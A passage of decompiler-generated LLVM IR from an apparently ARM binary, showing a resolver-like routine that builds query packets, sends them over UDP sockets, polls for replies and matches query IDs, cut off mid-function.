  %v3_127bc = inttoptr i32 %arg2 to i32*
  store i32 %v3_127b0, i32* %v3_127bc, align 4
  %v2_127c0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_127c0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_127c0 = phi i32 [ 1, %bb ], [ %v17_127c0.pre, %bb41 ]
  %v2_127c0 = phi i32 [ %v3_126e8, %bb ], [ %v2_127c0.pre, %bb41 ]
  store i32 %v2_127c0, i32* @r4, align 4
  ret i32 %v17_127c0

dec_label_pc_127c4:                               ; preds = %dec_label_pc_12760, %dec_label_pc_1277c, %dec_label_pc_12700, %dec_label_pc_12720, %dec_label_pc_126e4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_126e8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_12704.pre, { 2, 1, 0 }
  uselistorder i32 %v1_12788, { 1, 0 }
  uselistorder i32 %v0_12774, { 0, 1, 3, 2 }
  uselistorder i32 %v3_126e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 7, 8, 2, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_127c4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_12738, { 1, 0 }
}

define i32 @function_127d0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_127d0:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_127d0 = load i32, i32* @r4, align 4
  %v6_127d0 = load i32, i32* @r5, align 4
  %v9_127d0 = load i32, i32* @r6, align 4
  %v12_127d0 = load i32, i32* @r7, align 4
  %v15_127d0 = load i32, i32* @r8, align 4
  %v18_127d0 = load i32, i32* @sb, align 4
  %v21_127d0 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_127f0 = call i32 @function_f908(i32 512)
  store i32 %v1_127f0, i32* @r7, align 4
  %v1_127fc = call i32 @function_f908(i32 1025)
  %v2_12800 = icmp eq i32 %v1_127fc, 0
  br i1 %v2_12800, label %.thread8, label %bb

bb:                                               ; preds = %dec_label_pc_127d0
  %v1_12804 = load i32, i32* @r7, align 4
  %v3_12804 = icmp eq i32 %v1_12804, 0
  store i32 %v1_127fc, i32* %stack_var_-236, align 4
  br i1 %v3_12804, label %bb195, label %dec_label_pc_12818

.thread8:                                         ; preds = %dec_label_pc_127d0
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_12ef8

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_12ef8

dec_label_pc_12818:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_1281c = icmp eq i32 %arg3, 0
  br i1 %v2_1281c, label %dec_label_pc_12ef8, label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %dec_label_pc_12818
  %v2_12828 = load i8, i8* %arg1, align 1
  %v2_1282c = icmp eq i8 %v2_12828, 0
  br i1 %v2_1282c, label %dec_label_pc_12ef8, label %dec_label_pc_12834

dec_label_pc_12834:                               ; preds = %dec_label_pc_12824
  store i32 %tmp, i32* @r0, align 4
  %v0_12838 = call i32 @function_ecc0()
  %v2_12840 = add i32 %v0_12838, %tmp
  %v1_12844 = add i32 %v2_12840, -1
  %v2_12844 = inttoptr i32 %v1_12844 to i8*
  %v3_12844 = load i8, i8* %v2_12844, align 1
  %v2_12848 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_12848, i32* @r4, align 4
  %v7_1284c = icmp eq i8 %v3_12844, 46
  %. = zext i1 %v7_1284c to i32
  store i32 %v2_12848, i32* @r0, align 4
  %v1_12870 = call i32 @function_10840()
  store i32 75908, i32* @lr, align 4
  %v1_12880 = call i32 @function_10838()
  %v2_1288c = load i32, i32* @global_var_1aae8.553, align 4
  %v2_12890 = call i32 @function_c930(i32 %v2_1288c, i32 %arg3)
  %v3_12898 = load i8, i8* @global_var_18435.556, align 1
  %v4_12898 = zext i8 %v3_12898 to i32
  %v2_1289c = load i8, i8* bitcast (i8** @global_var_18434.555 to i8*), align 4
  %v3_1289c = zext i8 %v2_1289c to i32
  %v4_128a4 = mul nuw nsw i32 %v4_12898, 256
  %v5_128a4 = or i32 %v3_1289c, %v4_128a4
  store i32 %v5_128a4, i32* @sb, align 4
  store i32 %v2_12890, i32* @sl, align 4
  store i32 %v2_12848, i32* @r0, align 4
  %v1_128b8 = call i32 @function_10840()
  %v0_128c4 = load i32, i32* @r5, align 4
  %v2_128e4 = ptrtoint i8* %stack_var_-188 to i32
  %v6_12928 = bitcast i8* %stack_var_-188 to i32*
  %v2_12a08 = ptrtoint i32* %stack_var_-92 to i32
  %v3_12aa0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_12b04 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_12e50 = icmp eq i1 %v7_1284c, false
  %v7_12b58 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_12c3c = ptrtoint i32* %stack_var_-140 to i32
  %v9_12d34 = icmp eq i32 %tmp147, %arg2
  %v7_12cc8 = icmp eq i32 %arg2, 1
  %v2_12c70 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_128c4, 3
  br i1 %tmp292, label %dec_label_pc_128cc.lr.ph.preheader.lr.ph, label %dec_label_pc_12f04

dec_label_pc_128cc.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_12834
  %v2_12bdc = icmp eq i32 %tmp156, 0
  %v8_12ccc = icmp eq i32 %arg2, 28
  br label %dec_label_pc_128cc.lr.ph.preheader

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128cc.lr.ph, %dec_label_pc_12ee8.backedge
  %v1_128d4 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_128cc.lr.ph ], [ %v3_12a7c, %dec_label_pc_12ee8.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_128cc.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_12ee8.backedge ]
  %v7_128d0 = icmp eq i32 %v1_128d4, -1
  br i1 %v7_128d0, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_128cc
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_128cc, %bb199
  %v1_128d8 = xor i1 %v7_128d0, true
  call void @__pseudo_cond_branch(i1 %v1_128d8, i32 ptrtoint (i32* @global_var_ca18.558 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_128e4, i32* @r4, align 4
  %v0_128e8 = load i32, i32* @r7, align 4
  %v2_128ec = inttoptr i32 %v0_128e8 to i8*
  %v3_128ec = call i32 @function_ec20(i8* %v2_128ec, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_128fc = call i32 @function_ec20(i8* nonnull %stack_var_-188, i32 0)
  %v0_12900 = load i32, i32* @sb, align 4
  %v1_12900 = add i32 %v0_12900, 1
  %v3_12908 = urem i32 %v1_12900, 65536
  store i32 %v3_12908, i32* @sb, align 4
  %v0_12914 = load i32, i32* @r7, align 4
  %v5_12920 = trunc i32 %v1_12900 to i8
  store i8 %v5_12920, i8* %stack_var_-188, align 1
  %v7_12928 = call i32 @function_14060(i32* %v6_12928, i32 %v0_12914, i32 512, i32 1, i32 %v1_12900)
  store i32 %v7_12928, i32* @r5, align 4
  %v1_1292c = icmp slt i32 %v7_12928, 0
  br i1 %v1_1292c, label %dec_label_pc_12f04, label %dec_label_pc_12934

dec_label_pc_12934:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_1293c = load i32, i32* %stack_var_-236, align 4
  %v4_12940 = call i32 @function_ee60(i32 %v2_1293c, i32 %tmp, i32 1025)
  store i32 %v2_12848, i32* @r0, align 4
  %v1_12958 = call i32 @function_10840()
  %v1_12968 = call i32 @function_10838()
  %v1_12978 = load i32, i32* @sl, align 4
  %v4_12978 = mul i32 %v1_12978, 4
  %v5_12978 = add i32 %v4_12978, %arg4
  %v6_12978 = inttoptr i32 %v5_12978 to i32*
  %v7_12978 = load i32, i32* %v6_12978, align 4
  store i32 %v7_12978, i32* @r6, align 4
  br i1 %v1_12974, label %dec_label_pc_129bc, label %dec_label_pc_12980

dec_label_pc_12980:                               ; preds = %dec_label_pc_12934
  %v2_12988 = load i32, i32* @global_var_1ad48.561, align 4
  %v6_12990 = icmp slt i32 %v6_12eac, %v2_12988
  br i1 %v6_12990, label %dec_label_pc_12994, label %dec_label_pc_129bc

dec_label_pc_12994:                               ; preds = %dec_label_pc_12980
  store i32 ptrtoint (i32* @global_var_17c10.563 to i32), i32* @r1, align 4
  %v2_1299c = load i32, i32* %stack_var_-236, align 4
  %v4_129a0 = inttoptr i32 %v2_1299c to i8*
  %v5_129a0 = call i32 @function_138a8(i8* %v4_129a0, i32 ptrtoint (i32* @global_var_17c10.563 to i32), i32 1025, i32 %v2_12988)
  %v7_129b0 = load i32, i32* %v6_129b0, align 4
  store i32 %v7_129b0, i32* @r1, align 4
  %v4_129b8 = inttoptr i32 %v2_1299c to i8*
  %v5_129b8 = call i32 @function_138a8(i8* %v4_129b8, i32 %v7_129b0, i32 1025, i32 ptrtoint (i32* @global_var_1ad28.565 to i32))
  br label %dec_label_pc_129bc

dec_label_pc_129bc:                               ; preds = %dec_label_pc_12980, %dec_label_pc_12934, %dec_label_pc_12994
  store i32 %v2_12848, i32* @r0, align 4
  store i32 76240, i32* @lr, align 4
  %v1_129cc = call i32 @function_10840()
  %v2_129d8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_129d8, i32* %stack_var_-56, align 4
  %v0_129e8 = load i32, i32* @r7, align 4
  %v1_129e8 = load i32, i32* @r5, align 4
  %v2_129e8 = add i32 %v1_129e8, %v0_129e8
  %v1_129ec = sub i32 512, %v1_129e8
  %v8_129f4 = call i32 @function_14200(i32* nonnull %stack_var_-56, i32 %v2_129e8, i32 %v1_129ec, i32 %arg2, i32 %v2_129d8, i32 %arg2, i32 1)
  store i32 %v8_129f4, i32* @fp, align 4
  %v1_129f8 = icmp slt i32 %v8_129f4, 0
  br i1 %v1_129f8, label %dec_label_pc_12f04, label %dec_label_pc_12a00

dec_label_pc_12a00:                               ; preds = %dec_label_pc_129bc
  store i32 0, i32* @r4, align 4
  %v0_12a10 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_12a1c = inttoptr i32 %v0_12a10 to i8*
  %v4_12a1c = call i32 @function_13a8c(i32 10, i8* %v3_12a1c, i32 %v2_12a08)
  %v1_12a20 = load i32, i32* @r4, align 4
  %v7_12a24 = icmp sgt i32 %v4_12a1c, %v1_12a20
  br i1 %v7_12a24, label %bb201, label %dec_label_pc_12a00..thread11_crit_edge

dec_label_pc_12a00..thread11_crit_edge:           ; preds = %dec_label_pc_12a00
  %v3_12a30.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_12a00
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_12a00..thread11_crit_edge, %bb201
  %v3_12a30 = phi i8 [ %v3_12a30.pre, %dec_label_pc_12a00..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_12a30 = sext i8 %v3_12a30 to i32
  %v8_12a2c.op = urem i32 %v1_12a20, 256
  %v8_12a2c.op.op = mul nuw nsw i32 %v8_12a2c.op, 256
  %v4_12a38 = select i1 %v7_12a24, i32 %v8_12a2c.op.op, i32 0
  %v5_12a38 = or i32 %v4_12a30, %v4_12a38
  %v7_12a3c = icmp eq i32 %v5_12a38, 10
  br i1 %v7_12a3c, label %dec_label_pc_12a68, label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %.thread11
  %v0_12a54 = load i32, i32* @r6, align 4
  store i32 %v0_12a54, i32* @r0, align 4
  %v1_12a60 = call i32 @function_f3c0(i32 %v0_12a54)
  %v3_12a68.pre = load i8, i8* %stack_var_-100, align 1
  br label %dec_label_pc_12a68

dec_label_pc_12a68:                               ; preds = %.thread11, %dec_label_pc_12a50
  %v3_12a68 = phi i8 [ %v3_12a68.pre, %dec_label_pc_12a50 ], [ %v3_12a30, %.thread11 ]
  %v4_12a68 = sext i8 %v3_12a68 to i32
  %v5_12a78 = or i32 %v4_12a68, %v4_12a38
  %v3_12a7c = call i32 @function_f8dc(i32 %v5_12a78, i32 2, i32 17)
  %v1_12a80 = icmp slt i32 %v3_12a7c, 0
  br i1 %v1_12a80, label %.thread, label %dec_label_pc_12a98

.thread:                                          ; preds = %dec_label_pc_12a68
  br label %dec_label_pc_12ee8.backedge

dec_label_pc_12ee8.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_128cc, label %dec_label_pc_12f04

dec_label_pc_12a98:                               ; preds = %dec_label_pc_12a68
  %v4_12aa0 = call i32 @function_f7f4(i32 %v3_12a7c, %sockaddr* nonnull %v3_12aa0, i32 28)
  %v1_12aa4 = icmp slt i32 %v4_12aa0, 0
  br i1 %v1_12aa4, label %dec_label_pc_12aac, label %dec_label_pc_12acc

dec_label_pc_12aac:                               ; preds = %dec_label_pc_12a98
  %v0_12aac = call i32 @function_cc08()
  %v1_12ab0 = inttoptr i32 %v0_12aac to i32*
  %v2_12ab0 = load i32, i32* %v1_12ab0, align 4
  %v7_12ab4 = icmp eq i32 %v2_12ab0, 101
  br i1 %v7_12ab4, label %dec_label_pc_12e18, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_12aac
  br label %dec_label_pc_12ee8.backedge

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12a98
  %v0_12acc = load i32, i32* @r5, align 4
  %v1_12acc = load i32, i32* @fp, align 4
  %v2_12acc = add i32 %v1_12acc, %v0_12acc
  %v0_12ad0 = load i32, i32* @r7, align 4
  %v4_12adc = inttoptr i32 %v0_12ad0 to i32*
  %v5_12adc = call i32 @function_132f8(i32 %v3_12a7c, i32* %v4_12adc, i32 %v2_12acc, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v3_12a7c, i32* %stack_var_-44, align 4
  %v11_12b04 = call i32 @function_13424(%pollfd* %v10_12b04, i32 1, i32 10000, i32 1, i32 %v3_12a7c, i32 1, i32 0)
  %v1_12b08 = load i32, i32* @r4, align 4
  %v7_12b0c = icmp sgt i32 %v11_12b04, %v1_12b08
  br i1 %v7_12b0c, label %dec_label_pc_12b10, label %dec_label_pc_12e18

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12acc
  %v0_12b18 = load i32, i32* @r7, align 4
  %v4_12b20 = inttoptr i32 %v0_12b18 to i32*
  %v5_12b20 = call i32 @function_f84c(i32 %v3_12a7c, i32* %v4_12b20, i32 512, i32 %v1_12b08)
  store i32 %v5_12b20, i32* @fp, align 4
  %v7_12b2c = icmp slt i32 %v5_12b20, 12
  br i1 %v7_12b2c, label %dec_label_pc_12e4c, label %dec_label_pc_12b30

dec_label_pc_12b30:                               ; preds = %dec_label_pc_12b10
  %v0_12b30 = load i32, i32* @r7, align 4
  %v2_12b38 = inttoptr i32 %v0_12b30 to i8*
  %v3_12b38 = call i32 @function_14148(i8* %v2_12b38, i32 %v2_128e4)
  %v3_12b3c = load i8, i8* %stack_var_-188, align 1
  %v4_12b3c = sext i8 %v3_12b3c to i32
  store i32 %v4_12b3c, i32* @r6, align 4
  %v1_12b40 = load i32, i32* @sb, align 4
  %v9_12b40 = icmp eq i32 %v4_12b3c, %v1_12b40
  br i1 %v9_12b40, label %dec_label_pc_12b48, label %dec_label_pc_12e4c

dec_label_pc_12b48:                               ; preds = %dec_label_pc_12b30
  %v1_12b4c = load i32, i32* @r4, align 4
  %v9_12b4c = icmp eq i32 %tmp157, %v1_12b4c
  br i1 %v9_12b4c, label %dec_label_pc_12e4c, label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %dec_label_pc_12b48
  br i1 %v7_12b58, label %dec_label_pc_12b60, label %dec_label_pc_12bdc

dec_label_pc_12b60:                               ; preds = %dec_label_pc_12b54
  %v9_12b64 = icmp eq i32 %., %v1_12b4c
  br i1 %v9_12b64, label %dec_label_pc_12b6c, label %dec_label_pc_12bd0

dec_label_pc_12b6c:                               ; preds = %dec_label_pc_12b60
  store i32 %v2_12848, i32* @r5, align 4
  store i32 %v2_12848, i32* @r0, align 4
  %v1_12b84 = call i32 @function_10840()
  %v1_12b94 = call i32 @function_10838()
  store i32 %v2_12848, i32* @r0, align 4
  %v2_12ba0 = load i32, i32* @global_var_1ad48.561, align 4
  %v1_12bb0 = call i32 @function_10840()
  %v1_12bb8 = add i32 %v2_12ba0, -1
  store i32 %v1_12bb8, i32* @r4, align 4
  %v5_12bc0 = icmp slt i32 %v6_12eac, %v1_12bb8
  br i1 %v5_12bc0, label %.thread19, label %dec_label_pc_12bd0

.thread19:                                        ; preds = %dec_label_pc_12b6c
  %v7_12bc0 = add i32 %v6_12eac, 1
  %v6_12bc4 = load i32, i32* @r6, align 4
  store i32 %v6_12bc4, i32* @sb, align 4
  br label %dec_label_pc_12ee8.outer.backedge

dec_label_pc_12bd0:                               ; preds = %dec_label_pc_12b6c, %dec_label_pc_12b60
  %v0_12bd0 = call i32 @function_11004()
  br label %dec_label_pc_12c00

dec_label_pc_12bdc:                               ; preds = %dec_label_pc_12b54
  br i1 %v2_12bdc, label %dec_label_pc_12be4, label %dec_label_pc_12e4c

dec_label_pc_12be4:                               ; preds = %dec_label_pc_12bdc
  br i1 %tmp198, label %dec_label_pc_12bf8, label %dec_label_pc_12c10.preheader

dec_label_pc_12c10.preheader:                     ; preds = %dec_label_pc_12be4
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_12c10

dec_label_pc_12bf8:                               ; preds = %dec_label_pc_12be4
  %v0_12bf8 = call i32 @function_11004()
  br label %dec_label_pc_12c00

dec_label_pc_12c00:                               ; preds = %dec_label_pc_12bd0, %dec_label_pc_12bf8
  %storemerge4 = phi i32 [ %v0_12bf8, %dec_label_pc_12bf8 ], [ %v0_12bd0, %dec_label_pc_12bd0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_12bf8 ], [ 1, %dec_label_pc_12bd0 ]
  %v2_12c00 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_12c00, align 4
  br label %dec_label_pc_12f14

dec_label_pc_12c08:                               ; preds = %dec_label_pc_12c10
  %v2_12c08 = call i32 @function_1425c(i32 %v0_12c1c, i32 %v0_12c18)
  %v0_12c0c = load i32, i32* @r5, align 4
  %v2_12c0c = add i32 %v0_12c0c, %v2_12c08
  store i32 %v2_12c0c, i32* @r5, align 4
  %v0_12c14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12c10

dec_label_pc_12c10:                               ; preds = %dec_label_pc_12c10.preheader, %dec_label_pc_12c08
  %v0_12c18 = phi i32 [ 12, %dec_label_pc_12c10.preheader ], [ %v2_12c0c, %dec_label_pc_12c08 ]
  %v0_12c20 = phi i32 [ 0, %dec_label_pc_12c10.preheader ], [ %v0_12c14.pre, %dec_label_pc_12c08 ]
  store i32 %v0_12c18, i32* @r1, align 4
  %v0_12c1c = load i32, i32* @r7, align 4
  store i32 %v0_12c1c, i32* @r0, align 4
  %v1_12c20 = add i32 %v0_12c20, 1
  store i32 %v1_12c20, i32* @r4, align 4
  %v5_12c24 = icmp slt i32 %v0_12c20, 1
  br i1 %v5_12c24, label %dec_label_pc_12c08, label %dec_label_pc_12c28

dec_label_pc_12c28:                               ; preds = %dec_label_pc_12c10
  br label %dec_label_pc_12d84

dec_label_pc_12c3c:                               ; preds = %bb205
  store i32 %v2_12c3c, i32* @r4, align 4
  %v0_12c40 = load i32, i32* @r7, align 4
  %v0_12c48 = load i32, i32* @fp, align 4
  %v5_12c50 = call i32 @function_14270(i32 %v0_12c40, i32 %v0_12c44, i32 %v0_12c48, i32* nonnull %stack_var_-140)
  %v1_12c54 = icmp slt i32 %v5_12c50, 0
  br i1 %v1_12c54, label %dec_label_pc_12c60, label %dec_label_pc_12c7c

dec_label_pc_12c60:                               ; preds = %dec_label_pc_12c3c
  %v2_12c64 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_12c64, label %dec_label_pc_12e4c, label %dec_label_pc_12c6c

dec_label_pc_12c6c:                               ; preds = %dec_label_pc_12c60
  br i1 %v2_12c70, label %dec_label_pc_12e4c, label %dec_label_pc_12d98

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_12c3c
  %v2_12c80 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_12c80, label %dec_label_pc_12d24, label %dec_label_pc_12c88

dec_label_pc_12c88:                               ; preds = %dec_label_pc_12c7c
  %v0_12c88 = load i32, i32* @r8, align 4
  %v6_12c8c = add i32 %v0_12c88, 36
  %v7_12c8c = inttoptr i32 %v6_12c8c to i32*
  %v8_12c8c = load i32, i32* %v7_12c8c, align 4
  store i32 %v8_12c8c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_12c3c, i32* @r1, align 4
  store i32 %v0_12c88, i32* @r0, align 4
  %v0_12ca8 = call i32 @function_ec10()
  %v0_12cac = load i32, i32* @r8, align 4
  %v1_12cac = add i32 %v0_12cac, 4
  %v2_12cac = inttoptr i32 %v1_12cac to i32*
  %v3_12cac = load i32, i32* %v2_12cac, align 4
  %v7_12cb0 = icmp eq i32 %v3_12cac, 24
  br i1 %v7_12cb0, label %dec_label_pc_12cd4, label %dec_label_pc_12cb8

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12c88
  %v1_12cb8 = add i32 %v0_12cac, 28
  %v2_12cb8 = inttoptr i32 %v1_12cb8 to i32*
  %v3_12cb8 = load i32, i32* %v2_12cb8, align 4
  %v2_12cbc = icmp eq i32 %v3_12cb8, 0
  br i1 %v2_12cbc, label %dec_label_pc_12d98, label %dec_label_pc_12cc4

dec_label_pc_12cc4:                               ; preds = %dec_label_pc_12cb8
  br i1 %v7_12cc8, label %dec_label_pc_12cd4, label %bb203

bb203:                                            ; preds = %dec_label_pc_12cc4
  br i1 %v8_12ccc, label %dec_label_pc_12cd4, label %dec_label_pc_12d98

dec_label_pc_12cd4:                               ; preds = %dec_label_pc_12cc4, %bb203, %dec_label_pc_12c88
  %v9_12cd8 = icmp eq i32 %v3_12cac, %arg2
  br i1 %v9_12cd8, label %dec_label_pc_12cec, label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12cd4
  %v1_12ce0 = inttoptr i32 %v0_12cac to i32*
  %v2_12ce0 = load i32, i32* %v1_12ce0, align 4
  %v1_12ce4 = call i32 @function_fa5c(i32 %v2_12ce0)
  br label %dec_label_pc_12d70

dec_label_pc_12cec:                               ; preds = %dec_label_pc_12cd4
  %v1_12cf4 = add i32 %v0_12cac, 16
  %v2_12cf4 = inttoptr i32 %v1_12cf4 to i32*
  %v3_12cf4 = load i32, i32* %v2_12cf4, align 4
  %v2_12cf8 = sub i32 %tmp155, %stack_var_-192.0
  %v1_12cfc = add i32 %v2_12cf8, -1
  %v1_12d00 = add i32 %v3_12cf4, 4
  %v2_12d04 = mul i32 %v1_12d00, %v1_12cfc
  %v1_12d08 = add i32 %v0_12cac, 32
  %v2_12d08 = inttoptr i32 %v1_12d08 to i32*
  %v3_12d08 = load i32, i32* %v2_12d08, align 4
  %v2_12d10 = add i32 %v0_12cac, 36
  %v3_12d10 = inttoptr i32 %v2_12d10 to i32*
  store i32 %v1_12cfc, i32* %v3_12d10, align 4
  %tmp294 = icmp ugt i32 %v2_12d04, %v3_12d08
  br i1 %tmp294, label %dec_label_pc_12d98, label %dec_label_pc_12cec.dec_label_pc_12d6c_crit_edge

dec_label_pc_12cec.dec_label_pc_12d6c_crit_edge:  ; preds = %dec_label_pc_12cec
  %v1_12d6c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_12d6c

dec_label_pc_12d24:                               ; preds = %dec_label_pc_12c7c
  %v3_12d24 = load i32, i32* %stack_var_-140, align 4
  %v1_12d28 = call i32 @function_fa5c(i32 %v3_12d24)
  br i1 %v9_12d34, label %dec_label_pc_12d3c, label %dec_label_pc_12d70

dec_label_pc_12d3c:                               ; preds = %dec_label_pc_12d24
  %v0_12d3c = load i32, i32* @r8, align 4
  %v1_12d3c = add i32 %v0_12d3c, 16
  %v2_12d3c = inttoptr i32 %v1_12d3c to i32*
  %v3_12d3c = load i32, i32* %v2_12d3c, align 4
  %v9_12d44 = icmp eq i32 %v3_12d3c, %tmp146
  br i1 %v9_12d44, label %dec_label_pc_12d4c, label %dec_label_pc_12e44

dec_label_pc_12d4c:                               ; preds = %dec_label_pc_12d3c
  %v1_12d4c = add i32 %v0_12d3c, 36
  %v2_12d4c = inttoptr i32 %v1_12d4c to i32*
  %v3_12d4c = load i32, i32* %v2_12d4c, align 4
  %v1_12d50 = add i32 %v0_12d3c, 28
  %v2_12d50 = inttoptr i32 %v1_12d50 to i32*
  %v3_12d50 = load i32, i32* %v2_12d50, align 4
  %v3_12d54 = mul i32 %v3_12d4c, %tmp146
  %v4_12d54 = add i32 %v3_12d50, %v3_12d54
  store i32 %v4_12d54, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_12d60 = call i32 @function_ec10()
  %v0_12d64 = load i32, i32* @r8, align 4
  %v1_12d64 = add i32 %v0_12d64, 36
  %v2_12d64 = inttoptr i32 %v1_12d64 to i32*
  %v3_12d64 = load i32, i32* %v2_12d64, align 4
  %v1_12d68 = add i32 %v3_12d64, 1
  br label %dec_label_pc_12d6c

dec_label_pc_12d6c:                               ; preds = %dec_label_pc_12cec.dec_label_pc_12d6c_crit_edge, %dec_label_pc_12d4c
  %v1_12d6c = phi i32 [ %v0_12d64, %dec_label_pc_12d4c ], [ %v1_12d6c.pre, %dec_label_pc_12cec.dec_label_pc_12d6c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_12d68, %dec_label_pc_12d4c ], [ 0, %dec_label_pc_12cec.dec_label_pc_12d6c_crit_edge ]
  %v2_12d6c = add i32 %v1_12d6c, 36
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  store i32 %storemerge5, i32* %v3_12d6c, align 4
  br label %dec_label_pc_12d70

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d24, %dec_label_pc_12ce0, %dec_label_pc_12d6c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_12d6c ], [ 0, %dec_label_pc_12d24 ], [ %stack_var_-212.2, %dec_label_pc_12ce0 ]
  %v1_12d78 = add i32 %stack_var_-192.0, 1
  %v0_12d80 = load i32, i32* @r5, align 4
  %v2_12d80 = add i32 %v0_12d80, %v5_12c50
  store i32 %v2_12d80, i32* @r5, align 4
  br label %dec_label_pc_12d84

dec_label_pc_12d84:                               ; preds = %dec_label_pc_12c28, %dec_label_pc_12d70
  %v0_12c44 = phi i32 [ %v0_12c18, %dec_label_pc_12c28 ], [ %v2_12d80, %dec_label_pc_12d70 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_12c28 ], [ %stack_var_-212.1, %dec_label_pc_12d70 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_12c28 ], [ %v1_12d78, %dec_label_pc_12d70 ]
  %v2_12d8c = sub i32 %stack_var_-192.0, %tmp155
  %v4_12d8c = xor i32 %stack_var_-192.0, %tmp155
  %v5_12d8c = xor i32 %v2_12d8c, %stack_var_-192.0
  %v6_12d8c = and i32 %v5_12d8c, %v4_12d8c
  %v5_12d90 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_12d90, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_12d84
  %v7_12d90 = load i32, i32* @fp, align 4
  %v8_12d90 = sub i32 %v0_12c44, %v7_12d90
  %v10_12d90 = xor i32 %v7_12d90, %v0_12c44
  %v11_12d90 = xor i32 %v8_12d90, %v0_12c44
  %v12_12d90 = and i32 %v11_12d90, %v10_12d90
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_12d84, %bb204
  %v1_12d94.in = phi i32 [ %v6_12d8c, %dec_label_pc_12d84 ], [ %v12_12d90, %bb204 ]
  %v0_12d94.in = phi i32 [ %v2_12d8c, %dec_label_pc_12d84 ], [ %v8_12d90, %bb204 ]
  %v0_12d94 = icmp slt i32 %v0_12d94.in, 0
  %v1_12d94 = icmp slt i32 %v1_12d94.in, 0
  %v2_12d94 = xor i1 %v1_12d94, %v0_12d94
  br i1 %v2_12d94, label %dec_label_pc_12c3c, label %dec_label_pc_12d98

dec_label_pc_12d98:                               ; preds = %dec_label_pc_12c6c, %bb203, %dec_label_pc_12cec, %dec_label_pc_12cb8, %bb205
